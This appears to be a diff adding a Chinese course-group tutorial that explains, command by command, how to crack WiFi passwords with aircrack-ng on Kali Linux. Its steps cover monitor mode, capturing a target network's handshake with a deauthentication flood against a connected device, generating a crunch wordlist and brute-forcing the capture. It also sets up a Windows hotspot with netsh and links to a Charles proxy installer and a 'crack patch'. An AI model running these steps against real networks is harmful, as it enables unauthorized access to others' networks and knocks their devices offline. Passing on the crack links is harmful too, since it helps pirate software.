@@ -1,0 +1,65 @@
+
+PS：本教程有中山大学数计院15级网安课第4组成员提供
+
+************************************wifi密码破解******************************************
+
+*********利用kali系统里面的aircrack 破解WiFi密码*****
+1.工具：安装虚拟机VMware、kali的iso镜像文件、无线网卡一个
+***************打开kali的aircrack程序*********
+
+2.利用VMware搭建kali系统（由于kaLi是Linux系统的，所以我们必须通过虚拟机搭建）
+
+3.由于需要网卡监听周围的WiFi热点，但电脑内置的网卡不具备监听功能，需要一个外置的USB网卡
+
+4.输入代码：
+
+airmon-ng check kill// 杀死一切干扰无线网卡监听热点的信号
+
+airmon-ng start wlan0   //wlan0是无线网卡的名称，该操作是载入自己的网卡名
+
+ifconfig -a //该操作是激活无线网卡,此时无线网卡的名称将变成 wlan0mon,之前是wlan0
+
+airodump-ng wlan0mon  //该操作是开始监听周围WiFi热点，显示各个WiFi热点
+
+ctrl c停止监听
+
+5.选取其中的bssid,频道（ch）,以及WiFi源的设备的mac地址
+airodump-ng -c 频道(ch) --bssid bssid -w /root/桌面（用来存储抓包的目录） 网卡名
+//该操作是新建一个存储抓包（包里面即将存储WiFi密码的tcp数据信息，当然里面有加密的WiFi密码）
+
+aireplay-ng -0 20 -c wifi设备的mac地址 -a bssid 网卡名（一般为wlan0mon）
+//(20为用deauth洪水攻击WiFi设备的次数，原理是：先让设备掉线，我方伪装成连接方，设备会再自动连接，这个自动连接过程会进行三次握手，会发送tcp包给我方，我方窃取后即可用字典穷举法暴力破解加密的WiFi密码)
+
+
+****************注意：aircrack只负责抓取包含WiFi密码的数据包，不负责解密******************
+   此时，需要用kali里面的crunch程序生成字典，我在这里就设一个简单的字典：能破解所有字母+数字的密码，如果需要更复杂的，直接在字符串“abcdefghi...yz0123456789”后面添加字符
+
+代码：
+crunch  //打开crunch
+
+crunch 4 15 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -o /root/桌面/zidian.txt
+//4是密码最小长度，15是密码最大长度 密码类型具体可能包括26个大小写字母+数字 ，生成的密码字典文件名称为zidian.txt。但是，生成的文件也很大，这个文件有300多T,生成的时间估计可以睡i两天了，难度可想而知，暴力破解法基本上已经不符合潮流了（个人看法）
+
+返回aircrack界面：键入：
+aircrack-ng -w 密码字典文件名路径 /root/桌面-01.cap（握手包），回车后开始爆破
+
+（如果字典里面包含WiFi密码，则最终会输出，破解成功）
+
+************或者可以用kali自带的字典文件：路径：/usr/share/wordlists/rockyou.txt.gz
+需要解压：gzip -d /usr/share/wordlists/rockyou.txt.gz
+***************************在PC端建立无线热点***********************
+首先 ：可能无线热点可能会被禁用，所以需要进行以下操作：
+ctrl+r ->services.msc->Internet Connection Sharing (ICS)->启动”自动“模式
+
+1.netsh wlan set hostednetwork mode=allow
+2.netsh wlan set hostednetwork ssid=无线热点名称 key=密码
+3.netsh wlan start hostednetwork//开启无线热点
+4.打开网络共享中心->更改网络适配器->右击有网络的热点->共享给刚才建立的无线热点
+5.netsh wlan show hostednetwork//查看无线热点的情况
+6.netsh wlan stop hostednetwork//停止热点
+
+************************chales安装以及破解
+安装包地址：https://pan.baidu.com/s/1caploU
+破解补丁地址：https://pan.baidu.com/s/1hrRpzda
+
+
